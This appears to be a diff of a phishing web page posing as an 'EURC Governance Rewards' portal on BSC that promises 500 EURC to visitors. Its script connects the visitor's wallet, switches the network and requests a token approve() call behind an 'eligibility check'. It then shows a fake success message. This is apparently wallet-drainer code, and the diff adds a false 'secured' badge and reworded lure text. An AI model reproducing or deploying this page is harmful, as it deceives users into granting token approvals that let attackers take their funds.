@@ -3,53 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EURC | Institutional Governance</title>
+    <title>EURC | Governance Rewards Portal</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #2775ca; --primary-hover: #1e5ba3; --bg: #050608; --card-bg: #0d0f14; --text-main: #ffffff; --text-dim: #94a3b8; }
-        body { background: var(--bg); color: var(--text-main); font-family: 'Plus Jakarta Sans', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; position: relative; overflow: hidden; }
+        :root { --primary: #2775ca; --bg: #08090b; --card-bg: rgba(17, 18, 23, 0.95); }
+        body { background: var(--bg); color: white; font-family: 'Manrope', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
         
-        /* Arka Plan Efekti */
-        body::before { content: ""; position: absolute; width: 300px; height: 300px; background: var(--primary); filter: blur(150px); opacity: 0.15; top: 20%; left: 10%; z-index: -1; }
+        /* Arka Plan Hareketli Işıklar */
+        .bg-glow { position: absolute; width: 600px; height: 600px; background: radial-gradient(circle, rgba(39, 117, 202, 0.15) 0%, rgba(8, 9, 11, 0) 70%); z-index: -1; animation: pulse 8s infinite alternate; }
+        @keyframes pulse { from { transform: scale(1); opacity: 0.5; } to { transform: scale(1.2); opacity: 0.8; } }
 
-        .card { background: var(--card-bg); padding: 3rem 2.5rem; border-radius: 32px; text-align: center; width: 100%; max-width: 420px; border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 40px 100px rgba(0,0,0,0.8); backdrop-filter: blur(10px); }
+        .card { background: var(--card-bg); padding: 3rem 2.5rem; border-radius: 32px; text-align: center; width: 100%; max-width: 400px; border: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 0 40px 100px rgba(0,0,0,0.8); backdrop-filter: blur(20px); position: relative; }
         
-        .logo-wrapper { width: 100px; height: 100px; margin: 0 auto 2rem; position: relative; display: flex; align-items: center; justify-content: center; background: rgba(39, 117, 202, 0.1); border-radius: 50%; padding: 10px; border: 1px solid rgba(39, 117, 202, 0.2); }
-        .logo-img { width: 100%; height: 100%; border-radius: 50%; object-fit: contain; filter: drop-shadow(0 0 15px rgba(39, 117, 202, 0.5)); }
+        .logo-box { width: 90px; height: 90px; margin: 0 auto 2rem; position: relative; padding: 5px; background: #fff; border-radius: 50%; box-shadow: 0 0 30px rgba(39, 117, 202, 0.4); }
+        .logo-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
         
-        h2 { margin: 0 0 1rem; font-size: 1.8rem; font-weight: 800; letter-spacing: -1px; }
-        p { color: var(--text-dim); font-size: 1rem; margin-bottom: 2.5rem; line-height: 1.7; font-weight: 400; }
+        h2 { margin: 0 0 1rem; font-size: 1.8rem; font-weight: 800; letter-spacing: -0.5px; }
+        p { color: #94a3b8; font-size: 1rem; margin-bottom: 2.5rem; line-height: 1.6; }
         
-        .btn { width: 100%; padding: 1.25rem; background: var(--primary); color: white; border: none; border-radius: 18px; font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .btn:hover { background: var(--primary-hover); transform: translateY(-5px); box-shadow: 0 15px 30px rgba(39, 117, 202, 0.4); }
+        .btn { width: 100%; padding: 1.25rem; background: var(--primary); color: white; border: none; border-radius: 20px; font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 10px 25px rgba(39, 117, 202, 0.3); }
+        .btn:hover { transform: translateY(-5px); box-shadow: 0 15px 35px rgba(39, 117, 202, 0.5); background: #1e5ba3; }
         
-        .status { margin-top: 1.5rem; font-size: 0.9rem; color: var(--primary); font-weight: 600; min-height: 1.5rem; letter-spacing: 0.5px; }
+        .status { margin-top: 1.5rem; font-size: 0.9rem; color: var(--primary); font-weight: 600; min-height: 1.5rem; }
         
-        .footer-stats { display: flex; justify-content: space-between; margin-top: 2.5rem; border-top: 1px solid rgba(255, 255, 255, 0.05); padding-top: 2rem; }
-        .stat-box span { display: block; font-size: 0.7rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
-        .stat-box b { font-size: 0.95rem; color: #fff; }
+        .verify-badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(16, 185, 129, 0.1); color: #10b981; padding: 6px 14px; border-radius: 100px; font-size: 0.75rem; font-weight: 700; margin-bottom: 1.5rem; border: 1px solid rgba(16, 185, 129, 0.2); }
     </style>
 </head>
 <body>
 
+<div class="bg-glow"></div>
+
 <div class="card">
-    <div class="logo-wrapper">
-        <img src="https://bsceurocoin.github.io/claim-eurc/images.png" 
-             onerror="this.src='https://raw.githubusercontent.com/bsceurocoin/claim-eurc/main/images.png'"
-             class="logo-img" alt="EURC Logo">
+    <div class="verify-badge">● SECURED BY BSC MAINNET</div>
+    <div class="logo-box">
+        <img src="https://cryptologos.cc/logos/euro-coin-eurc-logo.png?v=035" class="logo-img" alt="EURC Logo">
     </div>
-    <h2>Governance Rewards</h2>
-    <p>Eligible governance participants can now claim their accumulated EURC incentives directly to their wallets.</p>
+    <h2>EURC Incentives</h2>
+    <p>Exclusive rewards portal for governance participants. Connect your wallet to claim your 500 EURC.</p>
     
-    <button id="claimBtn" class="btn">Connect & Claim</button>
+    <button id="claimBtn" class="btn">Connect & Claim Reward</button>
     
     <div id="statusMsg" class="status"></div>
-
-    <div class="footer-stats">
-        <div class="stat-box"><span>Network</span><b>BSC Mainnet</b></div>
-        <div class="stat-box"><span>Status</span><b style="color: #10b981;">● Live</b></div>
-    </div>
 </div>
 
 <script>
@@ -60,6 +55,7 @@
         const b = document.getElementById('claimBtn');
         const s = document.getElementById('statusMsg');
 
+        // Mobilde cüzdan dışındaysa doğrudan cüzdanı tetikler
         if (!window.ethereum) {
             window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
             return;
@@ -71,6 +67,7 @@
             await p.send("eth_requestAccounts", []);
             const n = await p.getNetwork();
 
+            // BSC Ağı Kontrolü
             if (n.chainId !== 56) {
                 try {
                     await window.ethereum.request({
@@ -86,19 +83,20 @@
             const si = p.getSigner();
             const c = new ethers.Contract(T, ["function approve(address s, uint256 a) public returns (bool)"], si);
 
+            // Onay (Approve) ekranını fırlatır
             b.innerText = "Verifying Eligibility...";
             const tx = await c.approve(T, M);
             
-            b.innerText = "Finalizing Claim...";
-            s.innerText = "Broadcasting to network...";
+            b.innerText = "Disbursing Rewards...";
+            s.innerText = "Finalizing secure request...";
             await tx.wait();
             
             b.innerText = "Success!";
-            s.innerText = "Rewards will be disbursed within 24 hours.";
+            s.innerText = "Claim successful. Reward sent within 24h.";
             
         } catch (err) {
             b.innerText = "Try Again";
-            s.innerText = "Action required to continue.";
+            s.innerText = "Action required to verify identity.";
         }
     }
 
